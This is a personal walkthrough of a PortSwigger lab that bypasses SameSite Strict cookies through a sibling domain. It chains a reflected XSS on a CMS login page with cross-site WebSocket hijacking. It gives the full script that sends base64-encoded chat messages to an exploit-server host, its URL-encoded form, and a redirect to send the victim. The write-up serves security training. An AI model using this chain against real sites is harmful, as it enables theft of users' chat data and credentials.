# Lab: SameSite Strict bypass via sibling domain
# https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-restrictions-via-vulnerable-sibling-domains/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain#
```bash
# Open live chat. Type some random strings into chat and reload the page.
# Check / GET request from burp.

Set-Cookie: session=8UOa0Y8aWdrmicz0bWgtP9gP4RBKvLYv; Secure; HttpOnly; SameSite=Strict

# Session cookie SameSite=Strict
```
```bash
# Check /chat GET request from burp.

# We see that there is no any unpredictable tokens so it is vulnerable to a csrf attack if we find a way to get around Same-Site limitation.

```

```bash
# Check /chat GET request with http from burp.

<form id="chatForm" action="wss://0aca008903fda52f817980dc00e6003a.web-security-academy.net/chat">

# Check chat.js file

Access-Control-Allow-Origin: https://cms-0aca008903fda52f817980dc00e6003a.web-security-academy.net

(function () {
    var chatForm = document.getElementById("chatForm");
    var messageBox = document.getElementById("message-box");
    var webSocket = openWebSocket();

    messageBox.addEventListener("keydown", function (e) {
        if (e.key === "Enter" && !e.shiftKey) {
            e.preventDefault();
            sendMessage(new FormData(chatForm));
            chatForm.reset();
        }
    });

# Contains an Access-Control-Allow-Origin header, which reveals a sibling domain

```

```bash
# Visit https://cms-0aca008903fda52f817980dc00e6003a.web-security-academy.net

username: a
password: a
Invalid username: a

# Try

username: <script>alert()</script>
password: a

# Reflected XSS.
```

```bash
# Send post /login to repeater and turn it to get request.
# It works so we can send it as get request.

<script>
    var ws = new WebSocket('wss://0ac90021046eb2018109fd8e0029001d.web-security-academy.net/chat');
    ws.onopen = function(evt) {
        ws.send("READY");
    };
    ws.onmessage = function(evt) {
        var message= evt.data;
        fetch("https://exploit-0a6400740432b2f681ebfc8601d6009d.exploit-server.net/exploit?message=" + btoa(message));
    };
</script>

# !!! When i sent this to victim it solved my lab but it normally continues so i will continue:

# Check acess log and you will see message? and value copy it.

eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9

# Decode it.

{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}

# So we can only see a new chat message because of same-site strict setting.
```
```bash
# Url encode our payload
%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%63%39%30%30%32%31%30%34%36%65%62%32%30%31%38%31%30%39%66%64%38%65%30%30%32%39%30%30%31%64%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%36%34%30%30%37%34%30%34%33%32%62%32%66%36%38%31%65%62%66%63%38%36%30%31%64%36%30%30%39%64%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e

# # Send post /login to repeater and turn it to get request. Put our payload as username and send it.

```
```bash
GET /login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%63%39%30%30%32%31%30%34%36%65%62%32%30%31%38%31%30%39%66%64%38%65%30%30%32%39%30%30%31%64%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%36%34%30%30%37%34%30%34%33%32%62%32%66%36%38%31%65%62%66%63%38%36%30%31%64%36%30%30%39%64%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=a HTTP/2

# It is making us code run.
```

```bash
# Send this to victim
<script>
    document.location = "https://cms-0ac90021046eb2018109fd8e0029001d.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%63%39%30%30%32%31%30%34%36%65%62%32%30%31%38%31%30%39%66%64%38%65%30%30%32%39%30%30%31%64%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%36%34%30%30%37%34%30%34%33%32%62%32%66%36%38%31%65%62%66%63%38%36%30%31%64%36%30%30%39%64%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=a";
</script>

```
```bash
# Check access log, decode the messages from there to get password and username.
# Login to account to be able to complete the lab.

# I hate csrf labs by the way. I try to send same code for hours and doesn't work and later on when i try it again it works it is so weird.
# Keep that in mind we all have that problem.
```


